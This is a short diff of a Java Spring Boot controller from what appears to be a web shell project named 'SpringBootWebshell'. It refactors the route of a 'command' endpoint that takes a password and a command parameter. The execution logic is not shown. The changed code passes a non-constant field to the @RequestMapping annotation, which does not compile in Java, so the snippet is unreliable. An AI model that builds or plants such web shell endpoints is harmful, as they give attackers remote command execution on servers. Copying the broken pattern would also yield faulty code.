@@ -19,7 +19,9 @@ public class IndexController {
     
     Map<String, String> settings = System.getenv();
     
-    @RequestMapping("/"+settings.getOrDefault("APP_NAME", "SpringBootWebshell"))
+    String path = "/"+settings.getOrDefault("APP_NAME", "SpringBootWebshell");
+    
+    @RequestMapping(path)
     public String command(String pwd, String cmd, Model model){
 
         String output = "";
